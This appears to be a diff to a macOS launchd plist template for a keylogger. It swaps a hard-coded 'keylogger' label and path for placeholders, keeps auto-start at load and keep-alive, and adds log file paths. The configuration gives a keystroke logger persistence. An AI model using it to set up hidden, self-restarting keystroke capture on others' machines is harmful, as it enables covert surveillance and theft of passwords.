@@ -3,14 +3,19 @@
 <plist version="1.0">
 <dict>
   <key>Label</key>
-  <string>keylogger</string>
+  <string>{LABEL}</string>
   <key>ProgramArguments</key>
   <array>
-      <string>/usr/local/bin/keylogger</string>
+      <string>{EXE}</string>
+      <string>{LOGFILE}</string>
   </array>
   <key>RunAtLoad</key>
   <true/>
   <key>KeepAlive</key>
   <true/>
+  <key>StandardOutPath</key>
+  <string>{LOGFILE_STDOUT}</string>
+  <key>StandardErrorPath</key>
+  <string>{LOGFILE_STDERR}</string>
 </dict>
 </plist>
